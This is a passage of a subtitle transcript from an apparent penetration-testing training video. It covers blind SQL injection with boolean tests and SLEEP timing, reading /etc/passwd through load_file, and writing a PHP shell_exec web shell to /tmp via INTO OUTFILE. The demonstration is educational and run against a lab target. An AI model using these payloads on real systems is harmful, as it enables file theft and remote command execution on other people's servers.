00:01:53.930\nSo that being said,\nlet's jump back into SQL.\n\n39\n00:01:53.930 --> 00:01:54.800\nWhere do we leave off?\n\n40\n00:01:54.800 --> 00:01:58.080\nWell, in the previous episode,\nwe looked at error-based enumeration.\n\n41\n00:01:58.080 --> 00:02:03.560\nWe were getting errors that let us\nrealize that we could inject SQL and\n\n42\n00:02:03.560 --> 00:02:09.760\nthen we injected SQL into the URL to try\nto enumerate more data out of the site,\n\n43\n00:02:09.760 --> 00:02:11.210\nout of the database, which we did.\n\n44\n00:02:11.210 --> 00:02:14.860\nWe got a couple of users and their\npasswords even though they're encrypted.\n\n45\n00:02:14.860 --> 00:02:18.660\nYou just run it through a decrypter and\nbada bing there's your passwords.\n\n46\n00:02:18.660 --> 00:02:19.160\nNo big deal.\n\n47\n00:02:20.360 --> 00:02:23.600\nBut what happens if the site\ndoes not give you any errors?\n\n48\n00:02:24.660 --> 00:02:30.390\nYou type in a string in the URL, or\nyou put something into an input box,\n\n49\n00:02:30.390 --> 00:02:33.510\nand it just comes back,\nor just nothing happens.\n\n50\n00:02:33.510 --> 00:02:36.260\n&gt;&gt; Well, at that point, I give up,\nI throw in the towel and I walk away.\n\n51\n00:02:36.260 --> 00:02:37.690\n&gt;&gt; That's right,\nsecurity through obscurity.\n\n52\n00:02:37.690 --> 00:02:40.480\nIt's so stinking hard,\nthis must be not worth my time.\n\n53\n00:02:40.480 --> 00:02:43.880\nNo, it doesn't mean you're done, just\nmeans you got to try a different door,\n\n54\n00:02:43.880 --> 00:02:45.480\nright, we just gotta try a different door.\n\n55\n00:02:45.480 --> 00:02:47.910\nAnd that's where blind SQL\ninjection comes into play.\n\n56\n00:02:47.910 --> 00:02:51.680\nSo we're not gonna be seeing any errors,\nwhich is why they call it blind, right?\n\n57\n00:02:51.680 --> 00:02:58.470\nYou're not seeing anything back,\nat least not overtly.\n\n58\n00:02:58.470 --> 00:02:59.860\n&gt;&gt; Yeah, not quite as obvious.\n\n59\n00:02:59.860 --> 00:03:01.200\n&gt;&gt; Not as obvious.\n\n60\n00:03:01.200 --> 00:03:05.170\nSo you gotta be really\nkeenly looking at the site.\n\n61\n00:03:05.170 --> 00:03:08.960\nFor any difference in what you saw before,\n\n62\n00:03:08.960 --> 00:03:11.600\nbefore you hit that enter key,\nand pushed your SQL.\n\n63\n00:03:11.600 --> 00:03:14.060\n&gt;&gt; You know I love those games where\nthey show you two pictures and\n\n64\n00:03:14.060 --> 00:03:15.600\nyou try to figure out what\nthe difference is between the two?\n\n65\n00:03:15.600 --> 00:03:16.680\n&gt;&gt; Yeah.\n&gt;&gt; I mean it's kind of what\n\n66\n00:03:16.680 --> 00:03:17.310\nyou're doing here.\n\n67\n00:03:17.310 --> 00:03:18.330\n&gt;&gt; Yeah, I like that analogy.\n\n68\n00:03:18.330 --> 00:03:19.100\nThat's really good.\n\n69\n00:03:19.100 --> 00:03:20.700\nYou're sitting there going.\n\n70\n00:03:20.700 --> 00:03:21.935\nThe banana is green.\n\n71\n00:03:21.935 --> 00:03:23.870\n&gt;&gt; [LAUGH]\n&gt;&gt; I see what's going on,\n\n72\n00:03:23.870 --> 00:03:26.660\nI'll circle that, I love the funny papers,\nit's so much fun.\n\n73\n00:03:26.660 --> 00:03:27.190\n&gt;&gt; Yeah.\n\n74\n00:03:27.190 --> 00:03:30.190\n&gt;&gt; So, yeah, kind of the idea,\nyou're looking for a difference.\n\n75\n00:03:30.190 --> 00:03:34.190\nAnd any difference might be\nthat key to let you know well,\n\n76\n00:03:34.190 --> 00:03:39.090\nsomething has changed, cuz if this\nsequel statement didn't go through\n\n77\n00:03:39.090 --> 00:03:41.200\nIt would've just not done anything.\n\n78\n00:03:41.200 --> 00:03:44.950\nIf it was sanitized it would just give me\nnormal, the same exact blue pipe print.\n\n79\n00:03:44.950 --> 00:03:47.820\nSo, look out for changes, and\n\n80\n00:03:47.820 --> 00:03:51.812\nthen we'll take a look if that doesn't\nhappen on what you can continue to do.\n\n81\n00:03:51.812 --> 00:03:56.740\nAll right, so let's look at blind SQL\ninjection, let me get our website back up.\n\n82\n00:03:56.740 --> 00:03:59.240\nHere it is, remember we have those\nlovely passwords and everything.\n\n83\n00:03:59.240 --> 00:04:01.230\nI didn't move away from it.\n\n84\n00:04:01.230 --> 00:04:04.560\nI left it up for you guys to look at,\nso you remember what we were doing.\n\n85\n00:04:04.560 --> 00:04:11.590\nBut let's go just to,\nback to good old this, right?\n\n86\n00:04:11.590 --> 00:04:15.190\nThat standard page we started off with,\nfantastic.\n\n87\n00:04:15.190 --> 00:04:17.880\nWhat you can do with BLAST 2,\n\n88\n00:04:17.880 --> 00:04:21.930\nlet's pretend that this site\ndoes not give us errors.\n\n89\n00:04:21.930 --> 00:04:23.650\nWhen we type in bad SQL, all right?\n\n90\n00:04:23.650 --> 00:04:27.480\nSo, remember we did the single quote and\nhit Return and it gets us here.\n\n91\n00:04:27.480 --> 00:04:29.320\nLet's pretend that doesn't happen.\n\n92\n00:04:29.320 --> 00:04:30.560\nOkay, so.\n\n93\n00:04:30.560 --> 00:04:32.410\n&gt;&gt; I don't see anything,\nI don't know where I should look.\n\n94\n00:04:32.410 --> 00:04:35.106\n&gt;&gt; Which is fine, [LAUGH] pay no attention\nto the man behind the curtain, right?\n\n95\n00:04:35.106 --> 00:04:38.103\n&gt;&gt; [LAUGH]\n&gt;&gt; So, what you would do for\n\n96\n00:04:38.103 --> 00:04:43.570\nblind SQL injection testing is\nthrow at it some actual SQL.\n\n97\n00:04:43.570 --> 00:04:45.500\nAnd see if it does something.\n\n98\n00:04:45.500 --> 00:04:49.780\nSo that's basically you're looking for\na true false kinda thing at this point.\n\n99\n00:04:49.780 --> 00:04:53.580\nIf something occurs then you know\nthat your SQL command got executed.\n\n100\n00:04:53.580 --> 00:04:55.900\nIf nothing occurs,\nyou get back to a site or\n\n101\n00:04:55.900 --> 00:05:02.150\njust their site takes you to a regular\npage, then you know that it's not working.\n\n102\n00:05:02.150 --> 00:05:02.790\nSo let's do that.\n\n103\n00:05:02.790 --> 00:05:08.407\nLet's try our and statement we'll say and\n\n104\n00:05:08.407 --> 00:05:14.500\none equals one semi colon\nharsh on that's it.\n\n105\n00:05:14.500 --> 00:05:19.250\nAnd I'm getting an error obviously\nbecause that but you wanna try that and\n\n106\n00:05:19.250 --> 00:05:22.390\nI wanna try something so\nthat's a correct statement.\n\n107\n00:05:22.390 --> 00:05:24.270\nOne does equals one.\n\n108\n00:05:24.270 --> 00:05:27.440\nAnd we're tagging that on to the end of\nthis little SQL statement right here.\n\n109\n00:05:29.040 --> 00:05:30.730\nSo one does equal one, that's good.\n\n110\n00:05:30.730 --> 00:05:32.170\nIt's a correct statement, it's true.\n\n111\n00:05:32.170 --> 00:05:36.110\nIf you don't see anything change,\nthen that's fine.\n\n112\n00:05:37.190 --> 00:05:37.821\nIf that doesn't work,\n\n113\n00:05:37.821 --> 00:05:41.450\nyou're not getting some output\ntry something that's not right.\n\n114\n00:05:41.450 --> 00:05:45.130\nWe try to force a problem, per say, right.\n\n115\n00:05:45.130 --> 00:05:46.120\nSo try one equals two.\n\n116\n00:05:48.080 --> 00:05:48.740\nRight?\n\n117\n00:05:48.740 --> 00:05:49.870\nMaybe the website changes.\n\n118\n00:05:51.060 --> 00:05:53.280\nYou're looking for\nthose subtle hints, right?\n\n119\n00:05:53.280 --> 00:05:56.580\nAnd that's basically\nwhere you would do that.\n\n120\n00:05:56.580 --> 00:06:00.310\nIf those don't work what you can do is\n\n121\n00:06:00.310 --> 00:06:04.690\ntry a very common technique is to build\nin yourself like a little test mechanism.\n\n122\n00:06:04.690 --> 00:06:07.560\nMechanism to see if they're\nactually working or not.\n\n123\n00:06:07.560 --> 00:06:10.690\nIf you're putting these things in and\nyou're not seeing any changes\n\n124\n00:06:10.690 --> 00:06:15.630\nit doesn't necessarily mean your SQL\nisn't actually getting executed.\n\n125\n00:06:15.630 --> 00:06:17.410\nIt just means you're not seeing it.\n\n126\n00:06:18.550 --> 00:06:22.520\nSo you wanna do something that\nwill make it more obvious\n\n127\n00:06:22.520 --> 00:06:26.150\nthat your SQL is being Executed.\n\n128\n00:06:26.150 --> 00:06:29.890\nAnd one of the most common ways to do\nthat is to call in the sleep function.\n\n129\n00:06:29.890 --> 00:06:33.160\nWhich basically you say\nsleep x amount of seconds.\n\n130\n00:06:33.160 --> 00:06:37.322\nAnd so if I say five seconds, the website\nwill hang for five seconds because\n\n131\n00:06:37.322 --> 00:06:41.170\nit's waiting five seconds before\nit issues the rest of the command.\n\n132\n00:06:42.170 --> 00:06:42.840\nOkay?\n\n133\n00:06:42.840 --> 00:06:47.790\nSo if the website hangs, I know that\nit's taking SQL injection, right?\n\n134\n00:06:47.790 --> 00:06:50.510\nBecause I've injected\nthe sleep function into there.\n\n135\n00:06:50.510 --> 00:06:53.970\nIf it doesn't hang, then I know\nthat it's not vulnerable, right?\n\n136\n00:06:53.970 --> 00:06:59.340\nAnd then if it does hang, I could\ncontinue to use sleep to verify that my\n\n137\n00:06:59.340 --> 00:07:05.340\ncode is working, cuz sleep is getting\nissued, it is being executed.\n\n138\n00:07:05.340 --> 00:07:07.430\nAnd then the rest of it should\nbe executed as well, right?\n\n139\n00:07:07.430 --> 00:07:10.340\nIf it doesn't, if it doesn't hang,\nthen I know my SQL was bad.\n\n140\n00:07:10.340 --> 00:07:11.840\nI need to go back and take a look.\n\n141\n00:07:11.840 --> 00:07:16.150\nMaybe I malformed it,\nI gotta make sure to verify my syntax.\n\n142\n00:07:16.150 --> 00:07:17.110\nAll that good stuff.\n\n143\n00:07:17.110 --> 00:07:20.350\nSo we can kinda use it as\na true-false statement for us.\n\n144\n00:07:20.350 --> 00:07:24.640\nIf my website hangs,\nthat SQL statement went through.\n\n145\n00:07:24.640 --> 00:07:28.170\nIf it doesn't hang, then I did something\nwrong and I need to try again.\n\n146\n00:07:28.170 --> 00:07:29.740\nAll right, so let's try that.\n\n147\n00:07:29.740 --> 00:07:31.090\nHow does that look in the URL?\n\n148\n00:07:31.090 --> 00:07:35.890\nObviously, that's where we like to\nhang out and back this monkey up so\n\n149\n00:07:35.890 --> 00:07:38.550\nI can make sure I get my thing correctly.\n\n150\n00:07:38.550 --> 00:07:40.000\nIs it -sleep?\n\n151\n00:07:40.000 --> 00:07:42.410\nYeah, there we go.\n\n152\n00:07:42.410 --> 00:07:47.008\nSo we just add -sleep and\nthen how many seconds you want to sleep.\n\n153\n00:07:47.008 --> 00:07:53.569\nSo we say -sleep, and then I say open\nparentheses, five, close parentheses.\n\n154\n00:07:53.569 --> 00:07:54.555\nI hit return.\n\n155\n00:07:54.555 --> 00:07:56.674\nYou'll notice right over here.\n\n156\n00:07:56.674 --> 00:07:58.184\nSwirly, swirly, swirly.\n\n157\n00:07:58.184 --> 00:08:02.000\nNow I set five seconds,\nI think it actually they do five seconds.\n\n158\n00:08:02.000 --> 00:08:03.010\n&gt;&gt; That was 500 monthly.\n\n159\n00:08:03.010 --> 00:08:03.580\n&gt;&gt; Awesome.\n\n160\n00:08:03.580 --> 00:08:05.845\nMike and I actually time in out right now.\n\n161\n00:08:05.845 --> 00:08:08.920\n[LAUGH] The fact that I,\nI hit sleep five, it did hang for\n\n162\n00:08:08.920 --> 00:08:10.740\nfive seconds then it came through.\n\n163\n00:08:10.740 --> 00:08:12.440\nAs we know if that works.\n\n164\n00:08:12.440 --> 00:08:15.530\nIf it hangs for ten seconds it's\nfine too even if I put five.\n\n165\n00:08:15.530 --> 00:08:18.010\nIf it hangs for\ntwo seconds that's fine too.\n\n166\n00:08:18.010 --> 00:08:20.880\nAs long as it hangs,\nthat's really what we're looking for.\n\n167\n00:08:20.880 --> 00:08:25.120\nEven if it doesn't hang for\nthe exact amount of time which you put it.\n\n168\n00:08:25.120 --> 00:08:26.320\nAll we're looking for\nreally is that it hung.\n\n169\n00:08:26.320 --> 00:08:29.530\nNow that we know what it does that,\nlike I said,\n\n170\n00:08:29.530 --> 00:08:32.600\nyou could continue to use that\nas a true/false variable.\n\n171\n00:08:32.600 --> 00:08:36.100\nBut now that we know that our SQL\nstatements are working correctly,\n\n172\n00:08:36.100 --> 00:08:41.510\nwe can just start firing them off.\n\n173\n00:08:41.510 --> 00:08:43.780\nDid I come up with anything\ninteresting I wanted to do with that?\n\n174\n00:08:43.780 --> 00:08:46.640\nNot really, I mean basically\nwe're back to what we did before.\n\n175\n00:08:46.640 --> 00:08:48.230\n&gt;&gt; That's gonna give you\nthe same commands, yup.\n\n176\n00:08:48.230 --> 00:08:49.240\n&gt;&gt; Yeah, exactly.\n\n177\n00:08:49.240 --> 00:08:51.430\nYou start looking for column enumeration,\n\n178\n00:08:51.430 --> 00:08:55.840\ntable enumeration, and\nexecuting that output to the.\n\n179\n00:08:55.840 --> 00:09:01.420\nSo all that we did in part one I\ncan now do here in part two now\n\n180\n00:09:01.420 --> 00:09:03.470\nthat I know blindly.\n\n181\n00:09:03.470 --> 00:09:07.580\n&gt;&gt; It just took you a little more effort\nto find out if they were even susceptible\n\n182\n00:09:07.580 --> 00:09:08.600\nto the SQL injection.\n\n183\n00:09:08.600 --> 00:09:09.900\nBecause we couldn't see the errors.\n\n184\n00:09:09.900 --> 00:09:13.480\nWe couldn't see the sequel statements\nthat are being used on the back end, so\n\n185\n00:09:13.480 --> 00:09:16.510\nwe're just trying to put\nsomething in there that will\n\n186\n00:09:16.510 --> 00:09:20.720\nfinish that sequel statement and let me\nexecute a command, hence the name blind.\n\n187\n00:09:20.720 --> 00:09:25.240\nAnd remember with the and statements,\nunlike the ors, both side have to be true.\n\n188\n00:09:25.240 --> 00:09:29.410\nSo, when you did the something and\none equals one.\n\n189\n00:09:29.410 --> 00:09:32.560\nWell we know that one equals one was true,\nbut the other side wasn't.\n\n190\n00:09:32.560 --> 00:09:35.830\nBut then the second one,\nyou're saying, okay one equals two.\n\n191\n00:09:35.830 --> 00:09:37.000\nYou know that's false.\n\n192\n00:09:37.000 --> 00:09:38.340\nThat falsifies the whole statement.\n\n193\n00:09:38.340 --> 00:09:41.940\nBoth sides of the end as you're\ntrying to get some kind of feedback\n\n194\n00:09:41.940 --> 00:09:42.880\nfrom that website.\n\n195\n00:09:42.880 --> 00:09:45.480\nBut I like the way you put it at\nthe very beginning of the show.\n\n196\n00:09:45.480 --> 00:09:48.120\nI think it might have been in\nthe previous episode even,\n\n197\n00:09:48.120 --> 00:09:50.330\nis you're throwing the kitchen sink at it,\nright?\n\n198\n00:09:50.330 --> 00:09:52.230\nI mean,\nthat's what Blind SQL injection is.\n\n199\n00:09:52.230 --> 00:09:56.870\nI can't see what's going on so I'm just\ngonna throw stuff at it, hoping I can\n\n200\n00:09:56.870 --> 00:10:01.460\nglean some bit of information, or some\nidea that what's happening is working.\n\n201\n00:10:01.460 --> 00:10:03.990\n&gt;&gt; That's right.\nWe're trying to make it break,\n\n202\n00:10:03.990 --> 00:10:06.540\nbecause if it breaks then I know that\nI've done something, I've affected it.\n\n203\n00:10:06.540 --> 00:10:07.960\nSo there we go.\n\n204\n00:10:07.960 --> 00:10:12.070\nSo use those Blind SQL techniques to\n\n205\n00:10:12.070 --> 00:10:15.480\nenumerate machines that\nyou don't get errors from.\n\n206\n00:10:15.480 --> 00:10:19.840\nThat being said, there's a couple other\nthings we can do with a SQL injection.\n\n207\n00:10:19.840 --> 00:10:23.168\nWe can read, write, and even execute code.\n\n208\n00:10:23.168 --> 00:10:24.056\nThat's scary.\n\n209\n00:10:24.056 --> 00:10:25.460\n&gt;&gt; [LAUGH]\n&gt;&gt; Well we're\n\n210\n00:10:25.460 --> 00:10:29.180\nnot going to execute code with SQL per se,\nwe're going to use the browser to do that.\n\n211\n00:10:29.180 --> 00:10:33.090\nBut we can read and\nwrite data into the data,\n\n212\n00:10:33.090 --> 00:10:36.460\nactually it's a machine itself,\nreally cool.\n\n213\n00:10:36.460 --> 00:10:40.114\nLet me show you to do that,\nif we want to read data,\n\n214\n00:10:40.114 --> 00:10:43.429\nwe're gonna use load file function, okay?\n\n215\n00:10:43.429 --> 00:10:48.661\nIf I go in here and we're gonna go\nback to the way we did with our union\n\n216\n00:10:48.661 --> 00:10:54.174\nselect statement, so I'm gonna get\nthat up there, I'll say union,\n\n217\n00:10:54.174 --> 00:10:58.581\nI'll select, and\nthen we remember we had six columns.\n\n218\n00:10:58.581 --> 00:11:00.430\nThat's what it was, six.\n\n219\n00:11:00.430 --> 00:11:05.670\nAnd columns two and three were good for\ninput and output, right?\n\n220\n00:11:05.670 --> 00:11:07.770\nSo that's what we're gonna do.\n\n221\n00:11:07.770 --> 00:11:12.770\nSo I'm gonna use column two\nto say load_file, like that.\n\n222\n00:11:12.770 --> 00:11:16.320\nAnd then open parenthesis,\ngive it double quotes.\n\n223\n00:11:16.320 --> 00:11:18.390\nAnd then tell it what file you wanna load.\n\n224\n00:11:18.390 --> 00:11:20.940\nSo I'm gonna say,\nremember we're reading a file.\n\n225\n00:11:20.940 --> 00:11:25.611\nIt wants to load this file into\nmy output here, into the column.\n\n226\n00:11:25.611 --> 00:11:27.332\nLet's see what happens.\n\n227\n00:11:27.332 --> 00:11:31.853\nLoad file, let's do se password,\ncuz that's always a good one,\n\n228\n00:11:31.853 --> 00:11:36.870\n/password, and then close it quotation,\nclose the parentheses.\n\n229\n00:11:36.870 --> 00:11:42.040\nAnd then remember you gotta have\nall your columns, six, like that.\n\n230\n00:11:42.040 --> 00:11:42.900\nAnd then just hit enter.\n\n231\n00:11:44.260 --> 00:11:44.780\nAnd look at that.\n\n232\n00:11:45.860 --> 00:11:48.830\nThere is the se password file.\n\n233\n00:11:48.830 --> 00:11:54.090\nSo I loaded a file from this\nweb server into that column and\n\n234\n00:11:54.090 --> 00:11:56.750\nit outputted the data\ninto our website here.\n\n235\n00:11:56.750 --> 00:11:58.660\nSo that's interesting.\n\n236\n00:11:58.660 --> 00:11:59.210\n&gt;&gt; That's scary.\n\n237\n00:11:59.210 --> 00:12:01.780\n&gt;&gt; Yeah,\nthat might pucker you up a little bit and\n\n238\n00:12:01.780 --> 00:12:03.800\ngo I don't like that if I'm a web server.\n\n239\n00:12:03.800 --> 00:12:04.960\nYou're starting to sweat.\n\n240\n00:12:04.960 --> 00:12:05.920\nYou're a web admin,\n\n241\n00:12:05.920 --> 00:12:09.250\nyou're going well I need to check\nmy data sanitization right now.\n\n242\n00:12:09.250 --> 00:12:11.450\n[LAUGH] We're going through code boys.\n\n243\n00:12:11.450 --> 00:12:14.920\n&gt;&gt; Pause the video [LAUGH]\n&gt;&gt; All right so not only can we read,\n\n244\n00:12:14.920 --> 00:12:17.440\nwe can also write to the server.\n\n245\n00:12:17.440 --> 00:12:21.430\nThat should also make you go whoa,\nwe can do what now?\n\n246\n00:12:21.430 --> 00:12:26.100\nYeah, so remember in previous episodes\nwe've used the whole php reverse shell\n\n247\n00:12:26.100 --> 00:12:26.956\nfrom pen test monkey.\n\n248\n00:12:26.956 --> 00:12:27.820\nI could upload that.\n\n249\n00:12:27.820 --> 00:12:32.790\nI could upload any kind of malicious code\nthat I want because I can write a file.\n\n250\n00:12:32.790 --> 00:12:38.500\nNow this server's actually I went through\nenumeration quite a bit with this.\n\n251\n00:12:38.500 --> 00:12:39.640\nThey've got it locked down.\n\n252\n00:12:39.640 --> 00:12:42.170\nYou have to be able to\nwrite it to somewhere where\n\n253\n00:12:42.170 --> 00:12:46.280\nit can display it as a webpage,\ncuz you have to visit that to execute it.\n\n254\n00:12:46.280 --> 00:12:47.590\nI can't do that with this server.\n\n255\n00:12:47.590 --> 00:12:49.800\nBut I can show you the steps\nthat you can take,\n\n256\n00:12:49.800 --> 00:12:52.460\nthat if it was vulnerable\nyou'd be able to do that.\n\n257\n00:12:52.460 --> 00:12:53.220\n&gt;&gt; Nice.\n&gt;&gt; So let's do that.\n\n258\n00:12:54.760 --> 00:12:58.700\nWhat we do is we do what's called\nan into out file function.\n\n259\n00:12:58.700 --> 00:13:03.310\nVery, very cool, so\nwe've got our union all select statement.\n\n260\n00:13:03.310 --> 00:13:03.880\nWe're gonna go in here.\n\n261\n00:13:03.880 --> 00:13:06.980\nAnd I'm just gonna give\nit a basic PHP function\n\n262\n00:13:11.220 --> 00:13:16.130\nto basically run the command prompts,\ncommand line, it's Linux.\n\n263\n00:13:16.130 --> 00:13:22.560\nSo what you do is just put your php\ncode in there, so it's php like that and\n\n264\n00:13:22.560 --> 00:13:29.080\nthen what it is echo shell underscore\nexact something that it say,\n\n265\n00:13:29.080 --> 00:13:34.320\nyeah then dollar sign underscore get,\n\n266\n00:13:34.320 --> 00:13:38.360\nand it will be open brackets,\n\n267\n00:13:38.360 --> 00:13:44.210\nquote command, quote close bracket,\nclose parenthesis.\n\n268\n00:13:44.210 --> 00:13:45.500\nDid I forget anything?\n\n269\n00:13:45.500 --> 00:13:46.330\nYeah, my semi-colon.\n\n270\n00:13:46.330 --> 00:13:47.060\nDon't forget that.\n\n271\n00:13:47.060 --> 00:13:48.060\nDone that before.\n\n272\n00:13:48.060 --> 00:13:53.550\nThen, a little bit of this action here.\n\n273\n00:13:53.550 --> 00:13:54.860\nNo, I don't need that, I don't need that.\n\n274\n00:13:54.860 --> 00:13:58.053\nThat should be, or I do need that.\n\n275\n00:13:58.053 --> 00:14:00.760\nNo, just making sure, [INAUDIBLE]\n&gt;&gt; Should be a quote.\n\n276\n00:14:00.760 --> 00:14:03.706\n&gt;&gt; Doesn't really matter.\n\n277\n00:14:03.706 --> 00:14:04.783\nDo I got one?\n\n278\n00:14:04.783 --> 00:14:05.420\n&gt;&gt; After the question mark?\n\n279\n00:14:05.420 --> 00:14:06.255\n&gt;&gt; Did I miss one?\n\n280\n00:14:08.405 --> 00:14:09.140\nThere's three.\n\n281\n00:14:09.140 --> 00:14:09.930\nI wanna make sure.\n\n282\n00:14:09.930 --> 00:14:10.910\nLet me look at my notes real quick.\n\n283\n00:14:10.910 --> 00:14:12.530\nYeah, double quote right there.\n\n284\n00:14:12.530 --> 00:14:16.709\nAnd I think I need one at the front\nof this as well, like so.\n\n285\n00:14:16.709 --> 00:14:19.937\nYeah that should be right.\n\n286\n00:14:19.937 --> 00:14:21.060\nIf it's not, it's not a big deal.\n\n287\n00:14:21.060 --> 00:14:24.780\nIt can't run anyway cuz I don't have\naccess to the server but I'm saying this\n\n288\n00:14:24.780 --> 00:14:28.290\nis what I want you to put into a file and\nthat's when we call into an out file.\n\n289\n00:14:29.490 --> 00:14:36.950\nSo I go to the end of my columns and\nI say into, out file, like that.\n\n290\n00:14:38.430 --> 00:14:40.980\nSingle quotation and\nwhere I want to put it all.\n\n291\n00:14:40.980 --> 00:14:45.450\nThe only directory I have on this\nserver that I can write to is /temp but\n\n292\n00:14:45.450 --> 00:14:50.480\nif this was a vulnerable web server,\nso if it's running Apache it would\n\n293\n00:14:50.480 --> 00:14:55.740\nbe /var/www/http and\nthat would be the web root or\n\n294\n00:14:55.740 --> 00:14:59.190\nany web directory you have\nthe ability to write to.\n\n295\n00:14:59.190 --> 00:15:01.000\nEven though, I'm running as root,\n\n296\n00:15:01.000 --> 00:15:02.920\nI thought that was odd that\nI couldn't write to it.\n\n297\n00:15:02.920 --> 00:15:04.580\nBut it gave me permission\ndenied every time.\n\n298\n00:15:04.580 --> 00:15:09.673\nSo, we're just gonna put it\nin the temp directory, okay?\n\n299\n00:15:09.673 --> 00:15:13.750\nSo /tmp, and\nwe'll just call this /shell.php.\n\n300\n00:15:13.750 --> 00:15:19.160\nLike that, close that out,\nand then hit return.\n\n301\n00:15:19.160 --> 00:15:21.330\nWhat did have a problem with my sequel.\n\n302\n00:15:21.330 --> 00:15:21.920\nWhat's my problem.\n\n303\n00:15:23.200 --> 00:15:25.140\nWell let's verify that let's log in.\n\n304\n00:15:25.140 --> 00:15:27.110\nBecause we do have a log in.\n\n305\n00:15:27.110 --> 00:15:34.220\nStar wars and let's go to c/tmpa, ls.\n\n306\n00:15:34.220 --> 00:15:35.480\nYeah I only got that one, so I did.\n\n307\n00:15:35.480 --> 00:15:38.160\nThere's a little problem with\nmy syntax here let's look for\n\n308\n00:15:38.160 --> 00:15:40.850\nit php echo shell exact.\n\n309\n00:15:42.110 --> 00:15:47.070\nI want to say I forgot a,\nI want to say I need this.\n\n310\n00:15:47.070 --> 00:15:51.120\nI think that's what it is.\n\n311\n00:15:51.120 --> 00:15:52.491\n&gt;&gt; Yeah, probably had to finish that PHP.\n\n312\n00:15:52.491 --> 00:15:55.364\n&gt;&gt; Yeah,\nI think that's what the problem was.\n\n313\n00:15:55.364 --> 00:15:58.843\nJust verifying, verifying,\nthat all looks right.\n\n314\n00:15:58.843 --> 00:16:02.051\nAnd let's try that.\n\n315\n00:16:02.051 --> 00:16:06.690\nLet's take a look,\ndo an ls having an issue.\n\n316\n00:16:06.690 --> 00:16:09.630\n&gt;&gt; Instead of that last question mark\nafter the semicolon I wonder if that\n\n317\n00:16:09.630 --> 00:16:12.370\nshouldn't be the greater than and\nno question mark.\n\n318\n00:16:12.370 --> 00:16:15.330\nI know a lot of time PHP has\nthe question mark at the beginning.\n\n319\n00:16:15.330 --> 00:16:15.878\nLet me just look.\n\n320\n00:16:15.878 --> 00:16:21.303\nLet me not get ahead of myself here.\n\n321\n00:16:21.303 --> 00:16:25.530\nQuestion mark,\nI'm pretty sure I need that.\n\n322\n00:16:25.530 --> 00:16:26.670\nBut we'll take it out, what the heck.\n\n323\n00:16:27.830 --> 00:16:29.660\nMike might be right, let's try it.\n\n324\n00:16:29.660 --> 00:16:31.670\nYeah, we're getting the same, same thing.\n\n325\n00:16:31.670 --> 00:16:32.170\n&gt;&gt; Same thing, yeah.\n\n326\n00:16:33.400 --> 00:16:34.268\nIt's not writing it.\n\n327\n00:16:34.268 --> 00:16:36.469\nYou can see that I've actually\nsuccessfully done this before because\n\n328\n00:16:36.469 --> 00:16:37.333\nthere's backdoor.php.\n\n329\n00:16:37.333 --> 00:16:37.954\n&gt;&gt; Mm-hm.\n\n330\n00:16:37.954 --> 00:16:42.868\n&gt;&gt; I'm getting muddled up with my syntax\nhere because I don't know what the heck\n\n331\n00:16:42.868 --> 00:16:46.747\nis going on-\n&gt;&gt; Looks like you closed your bracket.\n\n332\n00:16:46.747 --> 00:16:47.760\n&gt;&gt; Let's see here.\n\n333\n00:16:47.760 --> 00:16:50.144\nThis is where it gets fun-\n&gt;&gt; Yes.\n\n334\n00:16:50.144 --> 00:16:50.985\n&gt;&gt; Guys and girls, right?\n\n335\n00:16:50.985 --> 00:16:53.853\nIt's all about making sure\nyour syntax is correct.\n\n336\n00:16:53.853 --> 00:16:55.930\nAnd once it is, everything will work.\n\n337\n00:16:55.930 --> 00:16:58.840\nAnd I'm going to make it work, yes.\n\n338\n00:16:58.840 --> 00:16:59.710\nI'm going to make it work.\n\n339\n00:17:00.930 --> 00:17:02.100\nIs weird.\n\n340\n00:17:02.100 --> 00:17:02.800\nWhat's going on?\nOkay,\n\n341\n00:17:02.800 --> 00:17:06.340\nI'm gonna go back to Square really quick,\ncuz I want that PHP shown.\n\n342\n00:17:06.340 --> 00:17:07.960\nI'm just gonna backup so\nI don't have to retype it.\n\n343\n00:17:09.700 --> 00:17:10.990\nThere we go.\nThat's all in there.\n\n344\n00:17:12.500 --> 00:17:13.990\nLet me look through here.\n\n345\n00:17:13.990 --> 00:17:18.340\nOne also, three four five six\nseven eight into our file.\n\n346\n00:17:19.470 --> 00:17:23.900\nAnd then this, and then, okay, okay.\n\n347\n00:17:23.900 --> 00:17:26.020\nI think I found.\n\n348\n00:17:26.020 --> 00:17:27.270\nThis is fun ladies and gentlemen.\n\n349\n00:17:27.270 --> 00:17:31.910\nThis is the whole like welcome to\npin testing, hacking in general.\n\n350\n00:17:31.910 --> 00:17:35.320\nIt's always the little\ndetails that gets you and\n\n351\n00:17:35.320 --> 00:17:38.910\nI've just realized what the heck I\ndid wrong or didn't do, should I say.\n\n352\n00:17:38.910 --> 00:17:41.080\n&gt;&gt; You and me, Daniel,\ncuz I don't see it either.\n\n353\n00:17:41.080 --> 00:17:43.234\n&gt;&gt; Mike's pretty decent at SQL.\n\n354\n00:17:43.234 --> 00:17:46.398\nMike's not seeing it so it makes me\nfeel a little better that I forgot this.\n\n355\n00:17:46.398 --> 00:17:49.500\n&gt;&gt; [LAUGH]\n&gt;&gt; I just forgot something.\n\n356\n00:17:49.500 --> 00:17:53.470\nApparently, cuz we have an error here,\nit's kinda letting me know that it's doing\n\n357\n00:17:53.470 --> 00:17:58.020\nsomething wrong I should\ncomment everything else out.\n\n358\n00:17:58.020 --> 00:18:00.740\nLike this.\nLet's try that.\n\n359\n00:18:00.740 --> 00:18:01.450\nLook!\n\n360\n00:18:01.450 --> 00:18:02.440\nThings work.\n\n361\n00:18:02.440 --> 00:18:05.680\nSee, two little dashes can\nbreak your entire game.\n\n362\n00:18:05.680 --> 00:18:06.220\n&gt;&gt; Yup.\n\n363\n00:18:06.220 --> 00:18:09.370\n&gt;&gt; So you have to be thorough,\nyou have to be making sure.\n\n364\n00:18:09.370 --> 00:18:13.500\nThat's why watching us work with this and\n\n365\n00:18:13.500 --> 00:18:17.620\nfigure out what did I do wrong,\nthat is the pin testing day.\n\n366\n00:18:17.620 --> 00:18:19.200\nThat's what you're gonna do.\n\n367\n00:18:19.200 --> 00:18:20.710\nWhere did I not do this correctly?\n\n368\n00:18:20.710 --> 00:18:23.540\nCuz I've done this before and\nit's not working.\n\n369\n00:18:23.540 --> 00:18:25.670\nSo this kind of thing can happen.\n\n370\n00:18:25.670 --> 00:18:29.060\nNow we go in here, we do that ls in Temp.\n\n371\n00:18:29.060 --> 00:18:30.796\nHey, look, there's shell.php.\n\n372\n00:18:30.796 --> 00:18:35.195\nAnd if this were in the web root\nI could then browse to that 